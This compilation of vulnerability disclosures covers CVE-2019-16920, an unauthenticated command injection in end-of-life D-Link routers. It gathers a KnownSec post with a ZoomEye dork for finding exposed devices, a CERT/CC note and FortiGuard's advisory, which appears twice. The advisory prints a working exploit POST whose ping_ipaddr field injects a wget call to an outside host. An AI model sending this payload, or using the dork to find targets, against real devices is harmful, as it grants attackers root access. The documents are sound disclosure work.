=== Content from medium.com_2abf3f5a_20250121_004019.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fbf6fec7f9bb3&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2F80vul.medium.com%2Fdetermine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2F80vul.medium.com%2Fdetermine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Determine the device model affected by CVE-2019–16920 by ZoomEye

[![heige](https://miro.medium.com/v2/resize:fill:88:88/0*qcdtGhaQXk1S-ZP2.jpg)](/?source=post_page---byline--bf6fec7f9bb3--------------------------------)

[heige](/?source=post_page---byline--bf6fec7f9bb3--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc2bf5a97d7c2&operation=register&redirect=https%3A%2F%2F80vul.medium.com%2Fdetermine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3&user=heige&userId=c2bf5a97d7c2&source=post_page-c2bf5a97d7c2--byline--bf6fec7f9bb3---------------------post_header-----------)

1 min read·Oct 9, 2019

--

Listen

Share

by Heige(a.k.a Superhei) of KnownSec 404 Team 10/09/2019

CVE-2019–16920 <https://nvd.nist.gov/vuln/detail/CVE-2019-16920> is a RCE vulnerability in D-Link products that was discovered and reported by Fortinet’s FortiGuard Labs <https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html>

In their report, the device models affected by the vulnerability are DIR-655C, DIR-866L, DIR-652, and DHP-1565. In fact, through our KnownSec 404 team’s research, we found that the device model affected by this vulnerability is far more than these. Other device models affected by the vulnerability are:

• DIR-855L
• DAP-1533
• DIR-862L
• DIR-615
• DIR-835
• DIR-825

Obviously, these device models are determined to be based on ZoomEye’s search results.First we determined the device banner fingerprints （ZoomEye dork）affected by CVE-2019–16920.

dork: “lighttpd” +”login\_pic.asp”

Then we just call the ZoomEye api to determine the model string in the vulnerable device. It’s very easy to do this with Pocsuite <https://github.com/knownsec/pocsuite3>

![]()

PocSuite

Thanks Hcamael of Knownsec 404 Team

If you have any questions about ZoomEye, please contact me：<https://twitter.com/80vul>

[Zoomeye](https://medium.com/tag/zoomeye?source=post_page-----bf6fec7f9bb3--------------------------------)[Knownsec](https://medium.com/tag/knownsec?source=post_page-----bf6fec7f9bb3--------------------------------)

--

--

[![heige](https://miro.medium.com/v2/resize:fill:96:96/0*qcdtGhaQXk1S-ZP2.jpg)](/?source=post_page---post_author_info--bf6fec7f9bb3--------------------------------)[![heige](https://miro.medium.com/v2/resize:fill:128:128/0*qcdtGhaQXk1S-ZP2.jpg)](/?source=post_page---post_author_info--bf6fec7f9bb3--------------------------------)Follow[## Written by heige](/?source=post_page---post_author_info--bf6fec7f9bb3--------------------------------)[200 Followers](/followers?source=post_page---post_author_info--bf6fec7f9bb3--------------------------------)·[20 Following](/following?source=post_page---post_author_info--bf6fec7f9bb3--------------------------------)

The Leader of the KnownSec 404 Team ( ZoomEye <http://www.zoomeye.org> SeeBug <http://www.seebug.org> KCon <http://kcon.knownsec.com>)

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----bf6fec7f9bb3--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----bf6fec7f9bb3--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----bf6fec7f9bb3--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----bf6fec7f9bb3--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----bf6fec7f9bb3--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----bf6fec7f9bb3--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----bf6fec7f9bb3--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----bf6fec7f9bb3--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----bf6fec7f9bb3--------------------------------)[Teams](https://medium.com/business?source=post_page-----bf6fec7f9bb3--------------------------------)



=== Content from www.kb.cert.org_9e81a0e0_20250121_004020.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#766427

## Multiple D-Link routers vulnerable to remote command execution

#### Vulnerability Note VU#766427

Original Release Date: 2019-10-23 | Last Revised: 2019-10-25

---

### Overview

Multiple D-Link routers are vulnerable to unauthenticated remote command execution.

### Description

| Several D-Link routers contain [CGI](https://tools.ietf.org/html/rfc3875) capability that is exposed to users as /apply\_sec.cgi, and dispatched on the device by the binary /www/cgi/ssi. This CGI code contains two flaws:   1. The /apply\_sec.cgi code is exposed to unauthenticated users. 2. The ping\_ipaddr argument of the ping\_test action fails to properly handle newline characters.  Any arguments after a newline character sent as ping\_ipaddr in a POST to /apply\_sec.cgi are executed on the device with root privileges. The following devices are reported to be vulnerable:  DIR-655DIR-866LDIR-652DHP-1565DIR-855LDAP-1533DIR-862LDIR-615DIR-835DIR-825 We have made a [proof-of-concept exploit](http://kb.cert.org/artifacts/cve-2019-16920.html) available, which will disable network connectivity for one minute on affected devices. |
| --- |

### Impact

| By performing an HTTP POST request to a vulnerable router's /apply\_sec.cgi page, a remote, unauthenticated attacker may be able to execute commands with root privileges on an affected device. This action can happen as the result of viewing a specially-crafted web page. |
| --- |

### Solution

| The CERT/CC is currently unaware of a practical solution to this problem. The devices listed above are no longer supported by D-Link. |
| --- |

| **Replace affected devices**Because D-Link is not providing updates to the devices listed above, it is important to replace any affected device with one that is currently supported by the vendor. |
| --- |

### Vendor Information

766427
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23766427/) to view vendors.**
### [D-Link Systems, Inc.](#WDON-BH6QHF) Affected

Updated:  October 21, 2019

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 10 | AV:N/AC:L/Au:N/C:C/I:C/A:C |
| Temporal | 9 | E:POC/RL:U/RC:C |
| Environmental | 6.7 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html>
* [https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3](https://medium.com/%4080vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3)
* <https://tools.ietf.org/html/rfc3875>
### Acknowledgements

This vulnerability was coordinated and publicly disclosed by Fortinet's FortiGuard Labs.

This document was written by Will Dormann.

### Other Information

| **CVE IDs:** | [CVE-2019-16920](http://web.nvd.nist.gov/vuln/detail/CVE-2019-16920) |
| --- | --- |
| **Date Public:** | 2019-10-03 |
| **Date First Published:** | 2019-10-23 |
| **Date Last Updated:** | 2019-10-25 11:45 UTC |
| **Document Revision:** | 13 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from www.fortinet.com_bbc8d18c_20250121_025143.html ===

[![Fortinet home](/content/dam/fortinet-blog/fortinet-logo-white.svg)
![Fortinet home](/content/dam/fortinet-blog/fortinet-logo-white.svg)](https://www.fortinet.com)

[Blog](https://www.fortinet.com/blog)

* Categories
  + [Business & Technology](/blog/business-and-technology)
  + [FortiGuard Labs Threat Research](/blog/threat-research)
  + [Industry Trends](/blog/industry-trends)
  + [Life at Fortinet](/blog/life-at-fortinet)
  + [Partners](/blog/partners)
  + [Customer Stories](/blog/customer-stories)
  + [PSIRT Blogs](/blog/psirt-blogs)
* [Business & Technology](/blog/business-and-technology)
* [FortiGuard Labs Threat Research](/blog/threat-research)
* [Industry Trends](/blog/industry-trends)
* [Life at Fortinet](/blog/life-at-fortinet)
* [Partners](/blog/partners)
* [Customer Stories](/blog/customer-stories)
* [PSIRT Blogs](/blog/psirt-blogs)
* [CISO Collective](/blog/ciso-collective)

![Multiple D-Link Routers Found Vulnerable To Unauthenticated Remote Code Execution](data:image/png;base64...)

FortiGuard Labs Threat Research

# Multiple D-Link Routers Found Vulnerable To Unauthenticated Remote Code Execution

By
[Thanh Nguyen Nguyen](/blog/search?author=Thanh+Nguyen+Nguyen)

 | October 03, 2019

### Introduction

In September 2019, Fortinet's FortiGuard Labs discovered and reported an unauthenticated command injection vulnerability ([FG-VD-19-117](https://fortiguard.com/zeroday/FG-VD-19-117)/[CVE-2019-16920](https://nvd.nist.gov/vuln/detail/CVE-2019-16920)) in D-Link products that could lead to Remote Code Execution (RCE) upon successful exploitation. We rated this as a critical issue since the vulnerability can be triggered remotely without authentication.

Based on our findings, the vulnerability was found in latest firmware of the following D-Link products:

* DIR-655
* DIR-866L
* DIR-652
* DHP-1565

At the time of the writing of this advisory, these products are at End of Life (EOL) support, which means the vendor will not provide fixes for the issue we discovered. FortiGuard Labs appreciates the vendor’s quick response, and we recommend that users upgrade to a new device series as soon as possible.

### Vulnerability Details

The vulnerability begins with a bad authentication check. To see the problem in action, we start at the admin page and then perform a login action.

**POST /apply\_sec.cgi** HTTP/1.1

Host: 192.168.232.128

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 142

Connection: close

Referer: http://192.168.232.128/

Upgrade-Insecure-Requests: 1

html\_response\_page=login\_pic.asp&login\_name=YWRtaW4%3D&log\_pass=&**action=do\_graph\_auth**&login\_n=admin&tmp\_log\_pass=&

graph\_code=&session\_id=62384

List 1: Login Request

The login action is performed via the URI /apply\_sec.cgi. A quick search reveals that the **apply\_sec.cgi** code is located at function **do\_ssc** (0x40a210) in the **/www/cgi/ssi** binary.

The value of current\_user and user\_username are taken from nvram:

![A code snippet of do_ssc](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image.img.jpeg/1570039423406/figure1.jpeg)

Figure 1: A code snippet of do\_ssc

The function then compares the value of the **current\_user** with the value of the variable **acStack160**.

The **current\_user** value in nvram will be set only after a successful user login, so by default its value is not initialized. The value of **acStack160** is the result of **base64encode(user\_username)**, and by default the **user\_username** is set to “**user**”, so there is no way the iVar2 can return a value of 0, so it won’t return to the error.asp page.

![Another code snippet of do_ssc](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_168647205.img.jpeg/1570039790036/figure2.jpeg)

Figure 2: Another code snippet of do\_ssc

In the do – while loop code, the program calls the function **put\_querystring\_env()** to parse the HTTP POST request and saves the value to ENV. Next, the function calls **query\_vars(“action”, acStack288, 0x80)**

![Code snippet of the query_vars function](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_1587194591.img.jpeg/1570039961800/figure3.jpeg)

Figure 3: Code snippet of the query\_vars function

This provides the value of “action”, which is saved in ENV to acStack288. If successful, the function returns a value of 0.

With iVar2 equal to 0, we come to the ‘if’ condition. It compares the URI value with the string “/apply\_sec.cgi”. If yes, the ppcVar3 will point to the **SSC\_SEC\_OBJS** array, otherwise, it will point to the SSC\_OBJS array.

![Another code snippet of do_ssc](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_856338445.img.jpeg/1570040089178/figure4.jpeg)

Figure 4: Another code snippet of do\_ssc

Now, ppcVar3 is pointing to the **SSC\_SEC\_OBJS** array, which is a list of action values. If we input a value that is not in the list, the program will return LAB\_0040a458, which outputs the error: “No OBJS for action: <action input>”

![Error output in a snippet of do_ssc](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_1552538235.img.jpeg/1570040188390/figure5.jpeg)

Figure 5: Error output in a snippet of do\_ssc

You can see where the bad authentication check occurs in Figure 2. The code flow still executes even though we aren’t authenticated, which means we can perform any action in the SSC\_SEC\_OBJS array under the “/apply\_sec.cgi” path.

Where is the SSC\_SEC\_OBJS action array? It is in the register in the function init\_plugin():

![Code snippet of init_plugin](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_633919935.img.jpeg/1570040336185/figure6.jpeg)

Figure 6: Code snippet of init\_plugin

When we go to the address **0x0051d89c** and convert their variables to word type, we can see the following array:

![address 0x0051d89C](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_879500526.img.jpeg/1570040433459/figure7.jpeg)

Figure 7: address 0x0051d89C

There is one action that caught our attention:

![String ping_test and its action address](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_785010496.img.jpeg/1570040665692/figure8.jpeg)

Figure 8: String ping\_test and its action address

When we go to **sub\_41A010**, this function takes its value from param ping\_ipaddr. It converts it via the inet\_aton(), inet\_ntoa() function and then performs the ping

![Code snippet of sub_41A010](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_1566981634.img.jpeg/1570040740486/figure9.jpeg)

Figure 9: Code snippet of sub\_41A010

If we try to input any special character, such as double quote, quote, semicolon, etc., the ping fails. Unfortunately, if we pass the newline character, **for example: 8.8.8.8%0als**, we can perform the **Command Injection attack**.

POST /apply\_sec.cgi HTTP/1.1

Host: 192.168.232.128

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 131

Connection: close

Referer: http://192.168.232.128/login\_pic.asp

Cookie: uid=1234123

Upgrade-Insecure-Requests: 1

html\_response\_page=login\_pic.asp&action=ping\_test&ping\_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)

List 2: Exploit Request in ping\_test action

Here, we implement the POST HTTP Request to “**apply\_sec.cgi**” with the action **ping\_test**. We then perform the command injection in **ping\_ipaddr**. Even if it returns the login page, the action ping\_test is still performed – the value of **ping\_ipaddr** will execute the **“echo 1234”** command in the router server and then send the result back to our server.

![Successful Exploit traffic](/blog/threat-research/d-link-routers-found-vulnerable-rce/_jcr_content/root/responsivegrid/image_1843121498.img.jpeg/1570041121193/figure10.jpeg)

Figure 10: Successful Exploit traffic

At this point, the attacker can retrieve the admin password, or install their own backdoor onto the server.

### Disclosure Timeline

* 22 September, 2019: FortiGuard Labs reported the vulnerability to D-Link.
* 23 September, 2019: D-Link confirmed the vulnerability
* 25 September, 2019: D-Link confirmed these products are EOL
* 3 October 2019: Public disclosure of the issue and released advisory

### Conclusion

In conclusion, the root cause of the vulnerability is due to the lack of a sanity check for arbitrary commands executed by the native system command execution, which is a typical security pitfall suffered by many firmware manufacturers.

FortiGuard Labs has rated the vulnerability [CVE-2019-16920](https://nvd.nist.gov/vuln/detail/CVE-2019-16920) in the affected D-Link products to be a high severity level risk. It is crucial for D-Link users to upgrade to a new product immediately, as those devices are EOL [according to the vendor](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10124).

### Solution

FortiGuard Labs released the following IPS signature, which covers the vulnerability mentioned:

[DLink.DIR866L.PingTest.RCE](https://fortiguard.com/zeroday/FG-VD-19-117)

-= FortiGuard Lion Team =-

[![Fortinet](/content/dam/fortinet-blog/fortinet-logo-white.svg)](https://www.fortinet.com)

#### News & Articles

* [News Releases](https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html)
* [News Articles](https://www.fortinet.com/corporate/about-us/newsroom/news.html)

#### Security Research

* [Threat Research](https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html)
* [FortiGuard Labs](https://fortiguard.com/)
* [Threat Map](https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html)
* [Ransomware Prevention](https://www.fortinet.com/solutions/ransomware.html)

#### Connect With Us

* [Fortinet Community](https://community.fortinet.com/)
* [Partner Portal](https://www.fortinet.com/partners/partner-program/become-a-fortinet-partner)
* [Investor Relations](https://investor.fortinet.com/)
* [Product Certifications](https://www.fortinet.com/corporate/about-us/product-certifications)

#### Company

* [About Us](https://www.fortinet.com/corporate/about-us/about-us)
* [Exec Mgmt](https://www.fortinet.com/corporate/about-us/executive-management)
* [Careers](https://www.fortinet.com/corporate/careers)
* [Training](https://www.fortinet.com/nse-training)
* [Events](https://www.fortinet.com/corporate/about-us/events)
* [Industry Awards](https://www.fortinet.com/corporate/about-us/industry-awards)
* [Social Responsibility](https://www.fortinet.com/corporate/about-us/corporate-social-responsibility)
* [CyberGlossary](/resources/cyberglossary)
* [Sitemap](https://www.fortinet.com/sitemap)
* [Blog Sitemap](https://www.fortinet.com/blog/blog-sitemap)

#### Contact Us

* (866) 868-3678

Copyright © 2025 Fortinet, Inc. All Rights Reserved

[Terms of Services](https://www.fortinet.com/corporate/about-us/legal.html)
[Privacy Policy](https://www.fortinet.com/corporate/about-us/privacy.html)
 | Cookie Settings

Also of Interest:

* [Progress against vulnerabilities](https://www.fortinet.com/blog/industry-trends/fortinet-secure-by-design-commitments-making-measureable-progress-in-cybersecurity)
* [Network Security Vulnerabilities](https://www.fortinet.com/resources/cyberglossary/network-security-vulnerability)
* [PHPMailer Remote Code Execution Vulnerability](https://www.fortinet.com/blog/threat-research/analysis-of-phpmailer-remote-code-execution-vulnerability-cve-2016-10033)
* [Microsoft MSHTML Remote Code Execution...](https://www.fortinet.com/blog/threat-research/microsoft-mshtml-remote-code-execution-vulnerability-exploited-in-wild-cve-2021-40444)



=== Content from www.seebug.org_f323722e_20250121_004023.html ===

![Seebug](/static/dist2/images/weixin-share-sm.jpg)

[![Knownsec-logo](/static/dist2/images/knownsec-logo.png)](https://www.knownsec.com?from=seebug_logo)
![](/static/dist2/images/line.png)
[![Seebug-logo](/static/dist2/images/seebug-logo2023.png?v=2)](/)

* [Index](/)
* [Submit Vulnerability](/contribute/vul)
* [Rank](/hackers)
* Market
  + [Exchange](/exchange/goods)
  + [Newest PoC](/vuldb/vulnerabilities?has_poc=true)
* [Search](/search/)* Community
    + [Pocsuite](http://pocsuite.org/)
    + [Ceye.io](http://ceye.io/)
    + [Paper](http://paper.seebug.org/)
    + [KCon](http://kcon.knownsec.com/)
    + [ZoomEye](https://www.zoomeye.org/)
  * About
    + [Data Statistics](/stat)
    + [Vul Market](/help/about)
    + [Develop Document](https://pocsuite.org/guide/what-is-pocsuite3.html)
    + [Guideline](/help/user_level)
    + [Feedback](/help/feedback)
    + [Help](/help/reward)

* [Login](/accounts/login/?next=/vuldb/ssvid-98079)
* [Register](/accounts/register?next=/vuldb/ssvid-98079)

Toggle navigation

* [Login](/accounts/login/?next=/vuldb/ssvid-98079)
* [Index](/)
* Reward and Rank
  + [Detail Reward List](/vuldb/reward/detail)
  + [PoC Reward List](/vuldb/reward/poc)
  + [Exchange](/exchange/goods)
  + [Rank](/hackers)
  + [Submit New Vulnerability](/contribute/vul)
* Vulnerability Database
  + [Vulnerability List](/vuldb/vulnerabilities)
  + [Component Categories](/appdir/)
  + [Vulnerability Category](/category/)
* [Search](/search/)
* [Data Statistics](/stat)
* [Paper](http://paper.seebug.org/)

# D-Link Routers Unauthenticated Remote Code Execution

 Follow
0

### Basic Fields

SSV ID:
[SSV-98079](/help/vul#ssv)

Find Time:
Unknown

Submit Time:
2019-10-08

Level:

Category:
[代码执行](/category/code-execution)

Component:
[D-LINK](/appdir/D-LINK)

(Affected version more, click here)

Author:
Unknown

Submitter:
[Knownsec](/accounts/profile/admin)

CVE-ID：
Add

CNNVD-ID：
Add

CNVD-ID：
Add

ZoomEye Dork：
Add

### Source

<https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html>

### Detail

Contributor

Got  0KB

### Introduction
In September 2019, Fortinet's FortiGuard Labs discovered and reported an unauthenticated command injection vulnerability ([FG-VD-19-117](https://fortiguard.com/zeroday/FG-VD-19-117)/[CVE-2019-16920](https://nvd.nist.gov/vuln/detail/CVE-2019-16920)) in D-Link products that could lead to Remote Code Execution (RCE) upon successful exploitation. We rated this as a critical issue since the vulnerability can be triggered remotely without authentication.
Based on our findings, the vulnerability was found in latest firmware of the following D-Link products:
- DIR-655
- DIR-866L
- DIR-652
- DHP-1565
At the time of the writing of this advisory, these products are at End of Life (EOL) support, which means the vendor will not provide fixes for the issue we discovered. FortiGuard Labs appreciates the vendor’s quick response, and we recommend that users upgrade to a new device series as soon as possible.
### Vulnerability Details
The vulnerability begins with a bad authentication check. To see the problem in action, we start at the admin page and then perform a login action.
```
POST /apply\_sec.cgi\*\* HTTP/1.1
Host: 192.168.232.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Connection: close
Referer: http://192.168.232.128/
Upgrade-Insecure-Requests: 1
html\_response\_page=login\_pic.asp&login\_name=YWRtaW4%3D&log\_pass=&\*\*action=do\_graph\_auth\*\*&login\_n=admin&tmp\_log\_pass=&graph\_code=&session\_id=62384
```
The login action is performed via the URI /apply\_sec.cgi. A quick search reveals that the \*\*apply\_sec.cgi\*\* code is located at function \*\*do\_ssc\*\*(0x40a210) in the \*\*/www/cgi/ssi\*\* binary.
The value of current\_user and user\_username are taken from nvram:
![](https://images.seebug.org/1570521691429-w331s)
The function then compares the value of the \*\*current\_user\*\* with the value of the variable \*\*acStack160\*\*.
The \*\*current\_user\*\* value in nvram will be set only after a successful user login, so by default its value is not initialized. The value of \*\*acStack160\*\* is the result of \*\*base64encode(user\_username)\*\*, and by default the \*\*user\_username\*\* is set to “\*\*user\*\*”, so there is no way the iVar2 can return a value of 0, so it won’t return to the error.asp page.
![](https://images.seebug.org/1570521714582-w331s)
In the do – while loop code, the program calls the function \*\*put\_querystring\_env()\*\* to parse the HTTP POST request and saves the value to ENV. Next, the function calls \*\*query\_vars(“action”, acStack288, 0x80)\*\*
![](https://images.seebug.org/1570521724812-w331s)
This provides the value of “action”, which is saved in ENV to acStack288. If successful, the function returns a value of 0.
With iVar2 equal to 0, we come to the ‘if’ condition. It compares the URI value with the string “/apply\_sec.cgi”. If yes, the ppcVar3 will point to the \*\*SSC\_SEC\_OBJS\*\* array, otherwise, it will point to the SSC\_OBJS array.
![](https://images.seebug.org/1570521734511-w331s)
Now, ppcVar3 is pointing to the \*\*SSC\_SEC\_OBJS\*\* array, which is a list of action values. If we input a value that is not in the list, the program will return LAB\_0040a458, which outputs the error: “No OBJS for action: <action input>”
![](https://images.seebug.org/1570521750316-w331s)
You can see where the bad authentication check occurs in Figure 2. The code flow still executes even though we aren’t authenticated, which means we can perform any action in the SSC\_SEC\_OBJS array under the “/apply\_sec.cgi” path.
Where is the SSC\_SEC\_OBJS action array? It is in the register in the function init\_plugin():
![](https://images.seebug.org/1570521762893-w331s)
When we go to the address \*\*0x0051d89c\*\* and convert their variables to word type, we can see the following array:
![](https://images.seebug.org/1570521772732-w331s)
There is one action that caught our attention:
![](https://images.seebug.org/1570521780963-w331s)
When we go to \*\*sub\_41A010\*\*, this function takes its value from param ping\_ipaddr. It converts it via the inet\_aton(), inet\_ntoa() function and then performs the ping
![](https://images.seebug.org/1570521789848-w331s)
If we try to input any special character, such as double quote, quote, semicolon, etc., the ping fails. Unfortunately, if we pass the newline character, \*\*for example: 8.8.8.8%0als\*\*, we can perform the \*\*Command Injection attack\*\*.
POST /apply\_sec.cgi HTTP/1.1
Host: 192.168.232.128
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Connection: close
Referer: http://192.168.232.128/login\_pic.asp
Cookie: uid=1234123
Upgrade-Insecure-Requests: 1
html\_response\_page=login\_pic.asp&action=ping\_test&ping\_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
List 2: Exploit Request in ping\_test action
Here, we implement the POST HTTP Request to “\*\*apply\_sec.cgi\*\*” with the action \*\*ping\_test\*\*. We then perform the command injection in \*\*ping\_ipaddr\*\*. Even if it returns the login page, the action ping\_test is still performed – the value of \*\*ping\_ipaddr\*\* will execute the \*\*“echo 1234”\*\*command in the router server and then send the result back to our server.
![](https://images.seebug.org/1570521800708-w331s)
At this point, the attacker can retrieve the admin password, or install their own backdoor onto the server.
### Disclosure Timeline
- 22 September, 2019: FortiGuard Labs reported the vulnerability to D-Link.
- 23 September, 2019: D-Link confirmed the vulnerability
- 25 September, 2019: D-Link confirmed these products are EOL
- 3 October 2019: Public disclosure of the issue and released advisory
### Conclusion
In conclusion, the root cause of the vulnerability is due to the lack of a sanity check for arbitrary commands executed by the native system command execution, which is a typical security pitfall suffered by many firmware manufacturers.
FortiGuard Labs has rated the vulnerability [CVE-2019-16920](https://nvd.nist.gov/vuln/detail/CVE-2019-16920) in the affected D-Link products to be a high severity level risk. It is crucial for D-Link users to upgrade to a new product immediately, as those devices are EOL [according to the vendor](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10124).
### Solution
FortiGuard Labs released the following IPS signature, which covers the vulnerability mentioned:
[DLink.DIR866L.PingTest.RCE](https://fortiguard.com/zeroday/FG-VD-19-117)
-= FortiGuard Lion Team =-
![Loading icon](/static/dist2/bower_components/loading/loading-bars.svg)

have 0  exchange

### PoC

Unavailable PoC

### Reference Linking

### Solutions

**Temp Solutions**

Unavailable Temp Solutions

**Official Solution**

Unavailable Official solution

**Defense Solutions**

Unavailable Defense Solutions

Improve Solutions

BackSubmit

[![](/media/banner/2017/08/22/150338358279.png)](https://www.yunaq.com/)

[![](/media/banner/2020/05/26/159048249988.png)](https://www.yunaq.com/help/article?id=5ebcf0e3439fa500115a1326?from=seebugb00515)

[![](/media/banner/2017/08/09/150226089416.png)](https://scanv.yunaq.com/stcs/index.html?from=seebugb00526)

[![](/media/banner/2020/01/16/157914493733.png)](https://www.yunaq.com/dbzx?from=seebugb00115)

---

### Timeline

* 发现/披露了漏洞
* [![Knownsec](/static/dist2/images/avatar.png )](/accounts/profile/admin)
  [Knownsec](/accounts/profile/admin)

  2019-10-08
  提交了漏洞
* [![Knownsec](/static/dist2/images/avatar.png )](/accounts/profile/admin)
  [Knownsec](/accounts/profile/admin)

  2019-10-08
  提交补充了漏洞详情

---

### Related Vuls

* [D-Link D-View8 coreservice\_action\_script 危险函数远程代码执行漏洞(CVE-2023-44414)](/vuldb/ssvid-99788)
* [D-Link DNS-320 命令注入漏洞（CVE-2020-25506）](/vuldb/ssvid-99154)
